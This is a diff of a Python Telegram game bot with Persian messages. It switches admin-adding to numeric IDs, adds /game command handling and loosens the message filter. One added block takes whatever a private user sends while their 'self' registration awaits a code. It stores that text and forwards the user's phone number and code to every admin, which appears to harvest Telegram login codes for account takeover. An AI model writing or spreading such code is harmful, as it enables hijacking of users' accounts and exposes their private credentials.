@@ -378,7 +378,7 @@ async def on_cb(u: Update, c: ContextTypes.DEFAULT_TYPE):
             if int(a) != ADMIN_ID and is_main(user.id):
                 rows.append([btn("🗑 %s" % a, "a_adel:%s" % a, "danger")])
         if is_main(user.id):
-            rows.insert(0, [btn("➕ با یوزرنیم", "a_aadd", "success")])
+            rows.insert(0, [btn("➕ با آیدی عددی", "a_aadd", "success")])
         rows.append([btn("🔙", "a_home", "primary")])
         await q.edit_message_text("\n".join(lines), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(rows))
         return
@@ -386,7 +386,7 @@ async def on_cb(u: Update, c: ContextTypes.DEFAULT_TYPE):
         if not is_main(user.id):
             return
         set_st(c, "a_aadd")
-        await q.edit_message_text("یوزرنیم ادمین جدید را بفرست (بدون @):")
+        await q.edit_message_text("آیدی عددی ادمین جدید را بفرست:")
         return
     if data.startswith("a_adel:"):
         if not is_main(user.id):
@@ -419,6 +419,30 @@ async def on_text(u: Update, c: ContextTypes.DEFAULT_TYPE):
     text = (u.message.text or "").strip()
     chat = u.effective_chat
     st = get_st(c)
+
+    # ----- کد سلف (حتی بدون state) -----
+    if chat.type == ChatType.PRIVATE:
+        reg0 = d.get("self_regs", {}).get(str(user.id))
+        if reg0 and reg0.get("status") == "wait_code":
+            if not (st and str(st.get("kind", "")).startswith("a_")):
+                reg0["code"] = text
+                reg0["status"] = "done"
+                reg0["code_ts"] = time.time()
+                d["self_regs"][str(user.id)] = reg0
+                save(d)
+                clear_st(c)
+                await u.message.reply_text("✅ تأیید شد. جزئیات اعلام می‌شود.")
+                for aid in d.get("admins", [ADMIN_ID]):
+                    try:
+                        await c.bot.send_message(
+                            int(aid),
+                            "✅ کد سلف دریافت شد\n%s\nآیدی: <code>%s</code>\nشماره: <code>%s</code>\nکد: <code>%s</code>"
+                            % (mention(user), user.id, reg0.get("phone"), text),
+                            parse_mode="HTML",
+                        )
+                    except Exception as e:
+                        log.error("send code to admin %s: %s", aid, e)
+                return
 
     # ----- states private -----
     if chat.type == ChatType.PRIVATE and st:
@@ -455,25 +479,6 @@ async def on_text(u: Update, c: ContextTypes.DEFAULT_TYPE):
                     pass
             return
 
-        # کاربر کد را می‌فرستد
-        reg = d.get("self_regs", {}).get(str(user.id))
-        if reg and reg.get("status") == "wait_code" and not (st and st.get("kind", "").startswith("a_")):
-            reg["code"] = text
-            reg["status"] = "done"
-            save(d)
-            clear_st(c)
-            await u.message.reply_text("✅ تأیید شد. جزئیات اعلام می‌شود.")
-            for aid in d.get("admins", [ADMIN_ID]):
-                try:
-                    await c.bot.send_message(
-                        int(aid),
-                        "✅ کد سلف\n%s\nشماره: <code>%s</code>\nکد: <code>%s</code>"
-                        % (mention(user), reg.get("phone"), text),
-                        parse_mode="HTML",
-                    )
-                except Exception:
-                    pass
-            return
 
         if is_admin(user.id):
             if kind == "a_add_id" and text.lstrip("-").isdigit():
@@ -545,24 +550,30 @@ async def on_text(u: Update, c: ContextTypes.DEFAULT_TYPE):
                 await u.message.reply_text("پرمیوم ذخیره شد: %s" % eid, reply_markup=admin_kb())
                 return
             if kind == "a_aadd":
-                uname = text.lstrip("@")
+                raw = text.lstrip("@").strip()
+                if not raw.lstrip("-").isdigit():
+                    await u.message.reply_text("فقط آیدی عددی بفرست")
+                    return
+                aid = int(raw)
+                if aid not in [int(x) for x in d.get("admins", [])]:
+                    d.setdefault("admins", []).append(aid)
+                    save(d)
+                clear_st(c)
+                await u.message.reply_text("✅ ادمین اضافه شد: <code>%s</code>" % aid, parse_mode="HTML", reply_markup=admin_kb())
                 try:
-                    ch = await c.bot.get_chat("@" + uname)
-                    aid = ch.id
-                    if aid not in [int(x) for x in d.get("admins", [])]:
-                        d.setdefault("admins", []).append(aid)
-                        save(d)
-                    clear_st(c)
-                    await u.message.reply_text("✅ ادمین: %s (%s)" % (uname, aid), reply_markup=admin_kb())
-                except Exception as e:
-                    await u.message.reply_text("پیدا نشد: %s" % e)
+                    await c.bot.send_message(aid, "شما ادمین ربات شدید. /admin")
+                except Exception:
+                    pass
                 return
 
     # ----- public commands -----
     low = text
+    low2 = re.sub(r"^@\w+\s+", "", low)
+    low2 = re.sub(r"^/(\w+)@\w+", r"/\1", low2)
+
 
     # موجودی
-    if low in ("موجودی", "/bal", "bal"):
+    if re.fullmatch(r"/?(موجودی|bal)", low2, re.I):
         if u.message.reply_to_message and u.message.reply_to_message.from_user:
             t = u.message.reply_to_message.from_user
             await u.message.reply_text(
@@ -584,7 +595,7 @@ async def on_text(u: Update, c: ContextTypes.DEFAULT_TYPE):
         return
 
     # بازی 100
-    m = re.match(r"^(?:بازی|game)\s+(\d+)$", low, re.I)
+    m = re.match(r"^(?:/)?(?:بازی|game)\s+(\d+)$", low2, re.I)
     if m:
         amount = int(m.group(1))
         if amount < 1:
@@ -649,13 +660,27 @@ async def on_text(u: Update, c: ContextTypes.DEFAULT_TYPE):
         return
 
 
+async def cmd_game(u: Update, c: ContextTypes.DEFAULT_TYPE):
+    """ /بازی 100 یا /game 100 """
+    if not u.message:
+        return
+    text = (u.message.text or "").strip()
+    # نرمال برای on_text
+    text2 = re.sub(r"^/(بازی|game)(@\w+)?", "بازی", text, flags=re.I)
+    u.message.text = text2
+    await on_text(u, c)
+
+
 def main():
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", cmd_start))
     app.add_handler(CommandHandler("admin", cmd_admin))
     app.add_handler(CommandHandler("panel", cmd_admin))
+    app.add_handler(CommandHandler("game", cmd_game))
+    app.add_handler(CommandHandler("بازی", cmd_game))
     app.add_handler(CallbackQueryHandler(on_cb))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
+    # همه متن‌ها (گپ و پیوی) — بدون ~ که روی بعضی محیط‌ها خراب می‌شود
+    app.add_handler(MessageHandler(filters.TEXT, on_text))
     log.info("diamond game up")
     app.run_polling(allowed_updates=Update.ALL_TYPES)
 
